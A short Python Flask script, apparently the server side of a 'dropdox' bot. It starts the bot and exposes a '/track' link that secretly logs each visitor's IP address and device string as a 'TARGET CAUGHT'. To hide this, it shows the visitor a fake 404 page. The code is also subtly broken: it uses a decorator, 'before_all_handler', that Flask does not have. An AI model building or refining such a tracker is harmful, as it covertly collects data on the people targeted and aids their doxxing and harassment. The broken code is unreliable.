import os
import subprocess
from flask import Flask, request

app = Flask(__name__)

# Эта функция запустит бота ОДИН РАЗ при старте сервера
@app.before_all_handler # Для Flask 3.x используем просто запуск при импорте или обычный вызов
def start_bot():
    if not os.environ.get("BOT_STARTED"):
        print("--- ЗАПУСК БОТА DROPDOX ---")
        subprocess.Popen(["python3", "dropdox_bot.py"])
        os.environ["BOT_STARTED"] = "1"

@app.route('/track')
def track():
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    print(f"!!! TARGET CAUGHT !!! IP: {user_ip} Device: {user_agent}")
    return "<h1>404 Not Found</h1>", 404

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
    
